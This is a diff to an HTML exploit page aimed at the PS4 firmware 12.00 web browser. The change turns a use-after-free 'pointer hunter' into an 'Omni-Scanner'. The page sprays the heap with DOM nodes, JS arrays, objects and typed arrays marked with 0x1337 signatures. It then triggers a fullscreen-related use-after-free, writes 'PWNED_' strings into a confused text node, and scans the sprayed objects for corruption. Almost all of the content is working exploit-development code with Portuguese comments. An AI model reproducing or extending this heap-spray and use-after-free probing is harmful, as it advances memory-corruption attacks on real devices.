@@ -2,11 +2,11 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 12.00 - C++ Pointer Hunter</title>
+<title>PS4 12.00 - Omni-Scanner (Shotgun Spray)</title>
 </head>
 <body style="background:#111;color:#0f0;font-family:monospace;">
 
-<h2>UAF → C++ Pointer Hunter</h2>
+<h2>UAF → Omni-Scanner → Massive Memory Hunt</h2>
 <button onclick="runTest()">Run Test</button>
 
 <script>
@@ -20,12 +20,56 @@ function log(msg){
 }
 
 // ==========================
-// 🌍 HEAP SETUP (SUA FUNÇÃO ORIGINAL - A NOSSA REDE DE CAPTURA)
+// 🌍 OMNI-SPRAY (A REDE GIGANTE)
+function setupOmniSpray(){
+    log("[*] Iniciando Omni-Spray (7 Tipos de Memória)...");
+
+    window.sp_text = [];
+    window.sp_attr = [];
+    window.sp_jsarr = [];
+    window.sp_jsobj = [];
+    window.sp_u8 = [];
+    window.sp_ab = [];
+
+    for(let i=0; i<4000; i++){
+        // 1. DOM Text
+        let t = document.createTextNode("SAFE_TXT_" + i);
+        document.body.appendChild(t);
+        window.sp_text.push(t);
+
+        // 2. DOM Attribute
+        let d = document.createElement("div");
+        d.setAttribute("data-pwn", "SAFE_ATTR_" + i);
+        document.body.appendChild(d);
+        window.sp_attr.push(d);
+
+        // 3. JS Array Comum
+        window.sp_jsarr.push([0x1337, i, 0x1337]);
+
+        // 4. JS Objeto
+        window.sp_jsobj.push({ sig: 0x1337, id: i });
+
+        // 5. Uint8Array
+        let u8 = new Uint8Array(16);
+        u8[0] = 0x37; u8[1] = 0x13; // Assinatura em bytes
+        window.sp_u8.push(u8);
+
+        // 6. ArrayBuffer Bruto
+        let ab = new ArrayBuffer(32);
+        let view = new Uint32Array(ab);
+        view[0] = 0x13371337;
+        window.sp_ab.push(view);
+    }
+    log("[*] Omni-Spray concluído com sucesso!");
+}
+
+// ==========================
+// HEAP SETUP ORIGINAL (7. Float64Array - 100% INALTERADO)
 function setupHeap(){
     let arr=[];
     for(let i=0;i<5000;i++){
         let a=new Float64Array(8);
-        a[0]=i; // Cada array começa com o seu próprio número de ID
+        a[0]=i;
         arr.push(a);
     }
     return arr;
@@ -72,32 +116,81 @@ function inject(child){
 }
 
 // ==========================
-// 🔬 POINTER HUNTER (O SCANNER REAL)
-function domOverlapProbe(){
-    log("---- HUNTING FOR C++ POINTERS ----");
+// 🔬 OMNI-SCANNER PROBE
+function domOverlapProbe(fsTarget){
+    log("---- OMNI-SCAN PROBE ----");
 
     try{
-        // Nós ignoramos o DOM completamente e olhamos apenas para a memória do JS
-        if(!window.heap_press) return;
+        let n = fsTarget.firstChild;
+        if(!n) return;
 
-        for(let i=0; i<window.heap_press.length; i++){
-            
-            // O valor original era 'i'. Se o motor C++ tocou aqui por causa do UAF,
-            // esse valor vai ser substituído por um ponteiro de memória gigante!
-            if(window.heap_press[i][0] !== i){
-                
-                log("[$$$] JACKPOT! VAZAMENTO C++ DETECTADO!");
-                log("[$$$] O Array ID " + i + " foi sobrescrito pelo motor!");
-                
-                // Esse número decimal maluco É o endereço de memória real
-                log("[$$$] Ponteiro Cru (Float): " + window.heap_press[i][0]);
-                
-                return; // Paramos a busca
+        if(n.nodeType === 3){
+            log("[!!!] TEXTNODE CONFUSION");
+
+            // 💣 A ESCRITA: Usamos uma string única "PWNED" (repetida 60x = ~300 bytes)
+            // Não muito grande para evitar criar um bloco novo, não muito pequena.
+            try{
+                n.data = "PWNED_".repeat(60); 
+                log("[PWN] Omni-Write disparado");
+            }catch(e){
+                log("[UAF] write crash");
+            }
+
+            // ==========================
+            // 🔥 A CAÇADA (Varrendo todos os arrays)
+            try{
+                log("[*] Escaneando milhares de objetos...");
+
+                // 1. Checa TextNodes
+                for(let i=0; i<window.sp_text.length; i++){
+                    if(window.sp_text[i].data && window.sp_text[i].data.includes("PWNED")){
+                        log("[$$$] JACKPOT! TextNode atingido @ " + i); return;
+                    }
+                }
+                // 2. Checa Atributos
+                for(let i=0; i<window.sp_attr.length; i++){
+                    let a = window.sp_attr[i].getAttribute("data-pwn");
+                    if(a && a.includes("PWNED")){
+                        log("[$$$] JACKPOT! Atributo DOM atingido @ " + i); return;
+                    }
+                }
+                // 3. Checa JS Arrays
+                for(let i=0; i<window.sp_jsarr.length; i++){
+                    if(window.sp_jsarr[i][0] !== 0x1337){
+                        log("[$$$] JACKPOT! JS Array atingido @ " + i); return;
+                    }
+                }
+                // 4. Checa JS Objetos
+                for(let i=0; i<window.sp_jsobj.length; i++){
+                    if(window.sp_jsobj[i].sig !== 0x1337){
+                        log("[$$$] JACKPOT! JS Objeto atingido @ " + i); return;
+                    }
+                }
+                // 5. Checa Float64Array (Pressão original)
+                for(let i=0; i<window.heap_press.length; i++){
+                    if(window.heap_press[i][0] !== i){
+                        log("[$$$] JACKPOT! Float64Array atingido @ " + i); return;
+                    }
+                }
+                // 6. Checa Uint8Array
+                for(let i=0; i<window.sp_u8.length; i++){
+                    if(window.sp_u8[i][0] !== 0x37){
+                        log("[$$$] JACKPOT! Uint8Array atingido @ " + i); return;
+                    }
+                }
+                // 7. Checa ArrayBuffer
+                for(let i=0; i<window.sp_ab.length; i++){
+                    if(window.sp_ab[i][0] !== 0x13371337){
+                        log("[$$$] JACKPOT! ArrayBuffer atingido @ " + i); return;
+                    }
+                }
+
+                log("[SCAN] Omni-Scan finalizado. Nada nesta passada.");
+
+            }catch(e){
+                log("[UAF] scan crash");
             }
         }
-        
-        log("[SCAN] Arrays intactos neste ciclo...");
-
     }catch(e){
         log("[UAF] probe crash");
     }
@@ -124,10 +217,9 @@ function trigger(fsTarget){
         }catch(e){}
     }, 30);
 
-    // O Probe agora não precisa mais do fsTarget, ele vasculha o heap global
-    setTimeout(()=>domOverlapProbe(), 80);
-    setTimeout(()=>domOverlapProbe(), 180);
-    setTimeout(()=>domOverlapProbe(), 280);
+    setTimeout(()=>domOverlapProbe(fsTarget), 80);
+    setTimeout(()=>domOverlapProbe(fsTarget), 180);
+    setTimeout(()=>domOverlapProbe(fsTarget), 280);
 
     setTimeout(()=>{ alert(logBuffer.join("\n")); }, 450);
     setTimeout(()=>location.reload(), 600);
@@ -136,9 +228,12 @@ function trigger(fsTarget){
 // ==========================
 // MAIN
 function runTest(){
-    log("[*] Iniciando Pointer Hunter...");
+    log("[*] Iniciando teste Omni-Scanner...");
     
-    // Cria a nossa "rede" de Float64Arrays
+    // 1. Cria a nossa rede gigante primeiro
+    setupOmniSpray();
+
+    // 2. Mantém a pressão vital do Float64Array (inalterada)
     window.heap_press = setupHeap(); 
 
     let fsTarget=setupFullscreen();
